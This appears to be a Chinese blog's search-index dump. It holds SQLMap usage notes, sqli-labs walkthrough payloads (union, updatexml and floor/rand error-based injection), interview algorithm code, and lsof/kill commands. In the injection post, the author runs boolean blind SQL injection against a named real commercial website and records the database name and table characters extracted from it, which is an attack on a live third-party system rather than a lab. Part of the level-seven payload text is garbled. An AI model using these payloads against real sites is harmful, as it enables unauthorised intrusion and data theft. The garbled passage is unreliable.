本篇博客将带领大家深入了解SQLMap，从其基本原理、安装和配置，到实际使用中的常见场景和技巧。无论你是初学者还是有一定经验的安全从业者，相信都能从中获得有益的信息和灵感。让我们一起揭开SQLMap的神秘面纱，探索其在网络安全领域的强大能力。 Sqlmapsqlmap超详细笔记一款自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB。 1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。4、联合查询注入，可以使用union的情况下的注入。5、堆查询注入，可以同时执行多条语句的执行时的注入。 I. 判断是否存在注入1python sqlmap.py -u url II.判断文本中的请求是否存在注入1$ python sqlmap.py -r desktop/1.txt III.查询当前用户下的所有数据库1$ python sqlmap.py -u url --dbs 确定网站存在注入后，用于查询当前用户下的所有数据库。如果当前用户有权限读取包含所有数据库列表信息的表，使用该命令就可以列出所有相关数据库。 IV.获取数据库中的表名选取一个数据库，获取此库的表名 1python sqlmap.py -u url -D 数据库名 --tables V.获取表中的字段名4张表选取一个,获取其中字段名 1python sqlmap.py -u url -D 库名 -T 该库中的表名 –columns BUUCTF sqli-labs第一关&gt; ?id&#x3D;-1’ order by 4–+字段数 3 ?id&#x3D;-1’ union select 1,2,3–+2，3回显 ?id&#x3D;-1’ union select 1,database(),3–+database &#x3D; security 第二关?id&#x3D;1’ order by 1–+报错 order by 1– LIMIT 0,1数字型 ?id&#x3D;1 order by 3–+字段数 ：3 ?id&#x3D;-1 union select 1,2,3–+2，3回显 ?id&#x3D;-1 union select 1,database(),3–+database &#x3D; security 第三关?id&#x3D;1’ order by 5–+报错 ：order by 5– ‘) LIMIT 0,1 ?id&#x3D;1’) order by 5–+字段数 ：3 ?id&#x3D;-1’) union select 1,2,3–+2，3回显 ?id&#x3D;-1’) union select 1,database(),3–+database &#x3D; security 第四关先试一下 ：?id&#x3D;1’正常显示在试一下 ：?id&#x3D;1”报错 ：”1””) LIMIT 0,1 ?id&#x3D;1”) order by 4–+字段数 ：3 ?id&#x3D;-1”) union select 1,2,3–+2，3回显 ?id&#x3D;-1”) union select 1,database(),3–+database &#x3D; security 第五关 ?id=1&#39; order by 4--+字段数 ：3 ?id=1 and &#39;1&#39;=&#39;1&#39;&#39; 1&#39;=&#39;1&#39;&#39; LIMIT 0,1 &#39; ?id=1 and &#39;1&#39;=&#39;1&#39; 1&#39;=&#39;1&#39; LIMIT 0,1 &#39; &#39; &#39;1&#39;&#39; LIMIT 0,1 &#39; ?id=-1&#39; union select 1,2,3--+无显示位 使用报错注入1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+database = security 第六关 ?id=1’ --+报错 ?id=1&quot; --+显示 ?id=1&quot; order by 4--+字段数 ：3 ?id=-1&quot; union select 1,2,3--+无显示位 ?id=1&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+?id=1&quot; select count(*),concat((database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by xdatabase = security 第七关1” 1&#x3D;11&amp;quot;1&#x3D;1 1’ count(*),concat((database()),0x7e,flooorr(raandnd(0)*2))x from infmation_schema.tables ggroup byroup by x 示例网站http://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=1/1正常显示 http://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=1 and (length(database()))&gt;16database长度: 16 http://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=1 and ascii(substr(database(),2,1))&gt;101database前两位：te第一位 115 13862116 12386 116第二位100 13862101 12398 101 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16116 101 99 104 109 97 114 116 104 107 95 100 97 116 97 50t e c h m a r t h k _ d a t a 2database &#x3D; techmarthk_data2 and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0, 1 ), 1,1) ) ) &gt; 100109m s z t e s t c n115 122 116 101 115 116 99 110 ID&#x3D;1+%75%6e%69%6f%6e+%73%65%6c%65%63%74+1,2,3,4,5,6,7,8,10–+","categories":["web"]},{"title":"Interview","path":"/posts/4a17b156/","content":"面试题目的算法解决 Interview Questions整型数组，只有一组数出现奇数次，其他数都出现偶数次，怎么找到出现奇数次的数 a ^ a的结果为0，而0 ^ a的结果为a。也就是说，如果一个数在数组中出现偶数次，那么将数组中的所有数进行异或运算，最终结果为0；而如果一个数出现奇数次，那么最终结果就是这个数本身。 C语言 123456789101112131415161718192021#include &lt;stdio.h&gt;int FindOdd(int arr[], int size)&#123; int eor = 0; for (int i = 0; i &lt; size; i++) &#123; eor ^= arr[i]; &#125; return eor;&#125;int main()&#123; int arr[] = &#123;2, 4, 6, 2, 4, 8, 6&#125;; // 示例数组 int size = sizeof(arr) / sizeof(arr[0]); int OddN = FindOdd(arr, size); printf(&quot;出现奇数次的是: %d &quot;, OddN); return 0;&#125; python 12345678910def Find_Odd_Occuring_number(arr): eor = 0 for i in arr: eor ^= i return eorarr = [2, 4, 6, 2, 4, 8, 6]odd_numbers = Find_Odd_Occuring_number(arr)print(f&quot;出现奇数次的数是: &#123;odd_numbers&#125;&quot;) 整型数组，有两组数出现奇数次，其他数都出现偶数次，怎么找到出现奇数次的数 C语言1234567891011121314151617181920212223242526272829303132333435363738394041#include &quot;stdio.h&quot;int FindOdd(int arr[], int size)&#123; int eor = 0; for (int i = 0; i &lt; size; i++) &#123; eor ^= arr[i]; &#125; int rightone = eor &amp; (~eor + 1); int num1 = 0; int num2 = 0; for (int j = 0; j &lt; size; j++) &#123; if ((arr[j] &amp; rightone) == 0) &#123; num1 ^= arr[j]; &#125; else &#123; num2 ^= arr[j]; &#125; &#125; return (num1 &lt;&lt; 16) | num2;&#125;int main()&#123; int arr[] = &#123;2, 4, 6, 2, 4, 8, 6, 5&#125;; // 示例数组 int size = sizeof(arr) / sizeof(arr[0]); int result = FindOdd(arr, size); int num1 = (result &gt;&gt; 16) &amp; 0xFFFF; int num2 = result &amp; 0xFFFF; printf(&quot;The numbers occurring odd number of times are: %d and %d &quot;, num1, num2); return 0;&#125; python1234567891011121314151617181920def Find_Odd_Occuring_number(arr): eor = 0 for i in arr: eor ^= i rightone = eor &amp; (~eor + 1) eor2 = 0 eor3 = 0 for j in arr: if j &amp; rightone: eor2 ^= j else: eor3 ^= j return eor2, eor3arr = [2, 4, 6, 2, 4, 8, 6, 5]odd_numbers = Find_Odd_Occuring_number(arr)print(f&quot;出现奇数次的数是: &#123;odd_numbers&#125;&quot;) 插入算法Insertion_sort python12345678910111213141516171819def insertion_sort(arr): for i in range(1, len(arr)): key = arr[i] j = i - 1 while j &gt;= 0 and arr[j] &gt; key: arr[j + 1] = arr[j] j -= 1 arr[j + 1] = key# 从键盘输入待排序的列表input_str = input(&quot;请输入待排序的列表（以空格分隔）：&quot;)arr = list(map(int, input_str.split()))# 调用插入排序算法insertion_sort(arr)# 输出排序后的列表print(&quot;排序后的列表：&quot;, arr) 查看进程占用 该命令会显示占用8080端口的进程，有其pid ,可以通过pid关掉该进程1lsof -i tcp:8080 杀死进程 1kill pid","tags":["算法","面试题","C","python"]},{"title":"Gallery","path":"/Gallery/index.html","content":""},{"title":"友链","path":"/friends/index.html","content":"LzChengHan's BlogAorefs一蓑烟雨的博客Joker2YueAkilar糖果屋Fomalhaut🥝"},{"title":"音乐馆","path":"/music/index.html","content":""},{"title":"about","path":"/about/index.html","content":""},{"path":"/wiki/index.html","content":"MiKey的独立博客https://mikeytk.cn/wiki/"},{"title":"探索","path":"/explore/index.html","content":""},{"title":"tags","path":"/tags/index.html","content":""},{"title":"categories","path":"/categories/index.html","content":""}]